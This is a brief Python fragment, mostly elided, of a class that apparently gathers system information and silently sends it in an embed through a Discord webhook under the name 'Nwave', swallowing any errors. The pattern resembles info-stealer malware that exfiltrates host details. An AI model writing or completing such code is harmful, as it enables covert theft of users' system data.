...
class SystemInfo():
    def __init__(self, webhook: str) -> None:
        ...
        embed = Embed(title="System Information", color=0x00BFFF)
        ...
        try:
            webhook.send(
                ...
                username="Nwave",
                avatar_url="https://media.discordapp.net/attachments/1092389044811485298/1092389677283147817/Nwave.png"
            )
        except:
            pass
